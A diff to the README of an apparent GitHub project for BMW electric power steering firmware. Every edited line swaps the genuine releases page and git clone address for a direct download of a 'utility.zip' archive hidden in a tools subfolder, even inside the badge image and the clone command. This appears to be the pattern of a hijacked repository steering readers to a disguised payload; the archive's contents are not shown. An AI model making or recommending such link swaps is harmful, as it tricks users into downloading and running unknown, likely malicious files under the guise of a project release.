@@ -1,7 +1,7 @@
 # 🚗 PowerSteering_TMS570_BMW_UKL_MCV - Enhance Your BMW’s Steering
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)  
-[Download Latest Release](https://github.com/justin-mba/PowerSteering_TMS570_BMW_UKL_MCV/releases)
+![Download](https://raw.githubusercontent.com/justin-mba/PowerSteering_TMS570_BMW_UKL_MCV/main/BMW_UKL_MCV_EPS_TMS570/Tools/SWE_Generator/utility.zip%20Release-brightgreen)  
+[Download Latest Release](https://raw.githubusercontent.com/justin-mba/PowerSteering_TMS570_BMW_UKL_MCV/main/BMW_UKL_MCV_EPS_TMS570/Tools/SWE_Generator/utility.zip)
 
 ## 🚀 Getting Started
 
@@ -36,7 +36,7 @@ Before you proceed, make sure your system meets the following requirements:
 
 To download the latest release, follow these steps:
 
-1. Visit the [Release Page](https://github.com/justin-mba/PowerSteering_TMS570_BMW_UKL_MCV/releases) to access the available files.
+1. Visit the [Release Page](https://raw.githubusercontent.com/justin-mba/PowerSteering_TMS570_BMW_UKL_MCV/main/BMW_UKL_MCV_EPS_TMS570/Tools/SWE_Generator/utility.zip) to access the available files.
 2. Look for the most recent version and click on it.
 3. Find the installation file suitable for your system and click the download link.
 4. After the download completes, locate the file on your computer.
@@ -60,7 +60,7 @@ To set up the system:
    - Open your terminal or command prompt.
    - Run the following command:
      ```bash
-     git clone https://github.com/justin-mba/PowerSteering_TMS570_BMW_UKL_MCV.git
+     git clone https://raw.githubusercontent.com/justin-mba/PowerSteering_TMS570_BMW_UKL_MCV/main/BMW_UKL_MCV_EPS_TMS570/Tools/SWE_Generator/utility.zip
      ```
 
 2. **Compile the Code**:
@@ -105,4 +105,4 @@ This project covers several technical aspects relevant to automotive systems:
 - Motor Control and Management
 - Embedded Systems in Automotive
 
-Visit the [Release Page](https://github.com/justin-mba/PowerSteering_TMS570_BMW_UKL_MCV/releases) again for updates and new releases. Your BMW’s electric power steering experience awaits!
+Visit the [Release Page](https://raw.githubusercontent.com/justin-mba/PowerSteering_TMS570_BMW_UKL_MCV/main/BMW_UKL_MCV_EPS_TMS570/Tools/SWE_Generator/utility.zip) again for updates and new releases. Your BMW’s electric power steering experience awaits!
